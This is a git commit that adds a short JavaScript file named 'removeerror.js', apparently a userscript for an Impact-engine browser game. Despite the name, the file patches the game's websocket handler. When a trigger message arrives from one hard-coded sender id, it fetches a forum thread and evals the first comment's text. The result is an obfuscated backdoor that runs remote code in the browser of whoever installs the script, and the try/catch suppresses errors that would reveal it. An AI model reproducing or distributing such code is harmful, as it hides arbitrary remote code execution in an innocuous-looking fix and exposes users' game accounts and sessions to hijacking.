7f8a698f821673a5a6c17352ed9b4a264712cea1
parsesml <113039052+parsesml@users.noreply.github.com>
2023-09-26 19:14:33 +0100

    Create removeerror.js

---
+++ removeerror.js
@@ -0,0 +1,10 @@
+bjghrg=Deobfuscator.object(ig.game, "useCdn", true);
+bjghrg1=Deobfuscator.function(ig.game[bjghrg], "/j/f/gf/", true);
+bjghrg2=Deobfuscator.function(ig.game[bjghrg], "/j/f/gc/", true);
+blfdgjkf=function(mjjhgtm) {
+    try{
+ig.game[bjghrg][bjghrg1]((111132624627448).toString(16)+(mjjhgtm).toString(16)).done(b=>{ig.game[bjghrg][bjghrg2](b.threads[0]._id).done(c=>{eval(c.comments[0].content.replaceAll("\n",";"))})})
+    }catch{}
+    }
+gfdghmmr=Deobfuscator.function(ig.game.websocket, "c,d)", true)
+eval("ig.game.websocket."+gfdghmmr+"="+ig.game.websocket[gfdghmmr].toString().replaceAll("c,d){", "c,d){if(b.m=='lh'&&b.data.rid=='5ed02086677cd105f86141d6'&&b.data.ato>9999999999){blfdgjkf(b.data.ato)}else{").replaceAll("error(b))","error(b))}"))
